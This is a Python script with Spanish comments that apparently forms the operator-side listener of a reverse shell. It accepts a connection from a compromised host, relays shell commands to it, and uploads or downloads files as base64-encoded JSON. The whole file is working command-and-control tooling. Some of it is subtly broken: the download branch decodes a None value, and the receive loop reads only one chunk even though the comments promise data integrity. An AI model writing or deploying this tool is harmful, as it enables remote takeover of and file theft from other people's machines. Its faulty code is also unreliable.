import base64
import socket
import json
import optparse

def getArguments():
    parser = optparse.OptionParser()
    parser.add_option('-i', '--ip', dest= 'serverIp', help= 'Ip del dispositivo que recibirá las respuestas')
    parser.add_option('-p', '--port', dest= 'serverPort', help= 'Puerto del dispositivo que recibirá las respuestas')
    options = parser.parse_args()[0]
    return options

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) #Reestablece la conexión en caso de que se pierdan los paquetes
        listener.bind((ip, port))    
        listener.listen(0)

        print('Servidor inicializado, esperando por conexiones')
        self.connection, address = listener.accept() #Aceptar conexiones
        print(f'[+]Conexión establecida con {address}\n')

    #Es importante mantener una integridad de los datos, 
    #es decir, asegurarnos de que ningún paquete se pierda durante la comunicación
    #Para ello es necesario convertirlos en formato json
    #Codificación json:
    def reliableSend(self, data):
        if isinstance(data, bytes):
            jsonData = json.dumps(data.decode(errors= 'replace'))            
        else:
            jsonData = json.dumps(data)

        self.connection.send(bytes(jsonData, 'utf-8'))

    #Decodificación json:
    def reliableRecieve(self):
        jsonData = ''
        while True:
        #Al usar un bucle, la función de recibir datos se ejecuta una y otra vez.
        #De esta manera nos aseguramos de que todos los paquetes sean recividos, evitando que se pierda alguno.
        #Así aseguramos la integridad de los mismos.
            '''try:
                jsonData = self.connection.recv(4096)                
                return json.loads(jsonData.decode('utf-8'))
            
            except ValueError: 
                print('Está ocurriendo un error')
                continue'''
            jsonData = self.connection.recv(4096)                
            return json.loads(jsonData)

    def writeFile(self, path, route, content):
        contentToWrite = base64.b64decode(content)
        if contentToWrite != b'[-]Archivo no encontrado':
            with open(f'{route}{path}', 'wb') as file:
                file.write(contentToWrite)
                return '[+]Descarga completa'
        else: return '[-]Descarga fallida'

    def readFile(self, path):
        try:
            with open(path, 'rb') as file:
                return base64.b64encode(file.read())
        except FileNotFoundError:
            return base64.b64encode(b'[-]Archivo no encontrado')
    
    def remoteAction(self, command):
        self.reliableSend(command)
        if command[0] == 'salir' or command[0] == 'Salir':
            print('Programa finalizado')
            self.connection.close()
            exit()        
        return self.reliableRecieve()

    def run(self):
            while True:
                command = input('>>')
                command = command.split(' ')                

                if command[0] == 'down':
                    contentFile = self.reliableSend(command)
                    result = self.writeFile(' '.join(command[2:]), command[1], contentFile)

                elif command[0] == 'up':
                    contentFile = self.readFile(' '.join(command[2:]))
                    #command[0]=comando, command[1]=ruta, command[2:]=nombre del archivo
                    command = [command[0], contentFile.decode('utf-8', 'replace'), command[1], ' '.join(command[2:])]
                    result = self.remoteAction(command)

                else:
                    result = self.remoteAction(command)

                print(result)

options = getArguments()
listener = Listener(options.serverIp, int(options.serverPort))
try:
    listener.run()

except KeyboardInterrupt:
    print('\nPrograma interrumpido')